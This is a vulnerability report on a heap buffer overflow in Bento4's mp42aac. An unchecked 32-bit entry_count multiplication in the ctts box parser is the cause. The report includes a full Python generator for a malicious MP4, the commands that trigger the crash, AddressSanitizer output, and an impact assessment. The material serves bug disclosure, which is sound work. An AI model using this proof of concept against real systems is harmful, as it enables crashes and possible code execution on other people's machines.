## Bug0: Heap Buffer Overflow via 32-bit Integer Overflow in AP4_CttsAtom Entry Count

The function `AP4_CttsAtom::AP4_CttsAtom` in `Ap4CttsAtom.cpp` allocates a read buffer using `new unsigned char[entry_count * 8]` where `entry_count` is a 32-bit unsigned integer, and the multiplication wraps around to a tiny value when a crafted MP4 supplies `entry_count = 0x20000001`, causing a heap buffer overflow when the subsequent parsing loop reads past the end of the undersized allocation.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(type_str, payload=b""):
    size = 8 + len(payload)
    return struct.pack(">I4s", size, type_str.encode()) + payload

def fullbox(type_str, version, flags, payload=b""):
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(type_str, fb_payload)

identity_matrix = struct.pack(
    ">9i",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)

ftyp_payload = (
    b"isom"
    + struct.pack(">I", 0)
    + b"isom"
)
ftyp = box("ftyp", ftyp_payload)

mvhd_payload = (
    struct.pack(">II", 0, 0)
    + struct.pack(">I", 1000)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0x00010000)
    + struct.pack(">H", 0x0100)
    + b"\x00" * 10
    + identity_matrix
    + b"\x00" * 24
    + struct.pack(">I", 2)
)
mvhd = fullbox("mvhd", 0, 0, mvhd_payload)

tkhd_payload = (
    struct.pack(">II", 0, 0)
    + struct.pack(">I", 1)
    + b"\x00" * 4
    + struct.pack(">I", 0)
    + b"\x00" * 8
    + struct.pack(">hh", 0, 0)
    + struct.pack(">H", 0)
    + b"\x00" * 2
    + identity_matrix
    + struct.pack(">II", 0, 0)
)
tkhd = fullbox("tkhd", 0, 3, tkhd_payload)

mdhd_payload = (
    struct.pack(">II", 0, 0)
    + struct.pack(">I", 44100)
    + struct.pack(">I", 0)
    + struct.pack(">H", 0x55c4)
    + struct.pack(">H", 0)
)
mdhd = fullbox("mdhd", 0, 0, mdhd_payload)

hdlr_payload = (
    struct.pack(">I", 0)
    + b"soun"
    + b"\x00" * 12
    + b"\x00"
)
hdlr = fullbox("hdlr", 0, 0, hdlr_payload)

smhd_payload = struct.pack(">HH", 0, 0)
smhd = fullbox("smhd", 0, 0, smhd_payload)

url_box = fullbox("url ", 0, 1, b"")
dref_payload = struct.pack(">I", 1) + url_box
dref = fullbox("dref", 0, 0, dref_payload)
dinf = box("dinf", dref)

stsd = fullbox("stsd", 0, 0, struct.pack(">I", 0))
stts = fullbox("stts", 0, 0, struct.pack(">I", 0))
stsc = fullbox("stsc", 0, 0, struct.pack(">I", 0))
stsz = fullbox("stsz", 0, 0, struct.pack(">II", 0, 0))
stco = fullbox("stco", 0, 0, struct.pack(">I", 0))

# Trigger: entry_count = 0x20000001
# 0x20000001 * 8 overflows 32-bit arithmetic to 8,
# so only 8 bytes are allocated but the loop reads beyond that boundary.
TRIGGER_ENTRY_COUNT = 0x20000001
ctts_entries = struct.pack(">II", 1, 0)  # 1 real entry so stream.Read succeeds
ctts_payload = struct.pack(">I", TRIGGER_ENTRY_COUNT) + ctts_entries
ctts = fullbox("ctts", 0, 0, ctts_payload)

stbl_content = stsd + stts + stsc + stsz + stco + ctts
stbl = box("stbl", stbl_content)
minf_content = smhd + dinf + stbl
minf = box("minf", minf_content)
mdia_content = mdhd + hdlr + minf
mdia = box("mdia", mdia_content)
trak_content = tkhd + mdia
trak = box("trak", trak_content)
moov_content = mvhd + trak
moov = box("moov", moov_content)

mp4_data = ftyp + moov
with open("poc_input.mp4", "wb") as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000178 at pc 0x56078a6bb140 bp 0x7ffffae2e590 sp 0x7ffffae2e580
READ of size 1 at 0x502000000178 thread T0
    #0 0x56078a6bb13f in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa113f)
    #1 0x56078a6bc087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who can supply a crafted MP4 file to any process that invokes mp42aac gains the ability to trigger a heap buffer overflow through the integer overflow in the `ctts` box entry count field, which can corrupt adjacent heap metadata or data and potentially lead to arbitrary code execution. The attack surface covers all mp42aac invocations on untrusted input because no upper-bound validation is applied to `entry_count` before the multiplication and allocation in `AP4_CttsAtom::AP4_CttsAtom`. The same class of vulnerability exists in the `trun`, `tfra`, and `stz2` box parsers which share the same unchecked `SetItemCount` call pattern.
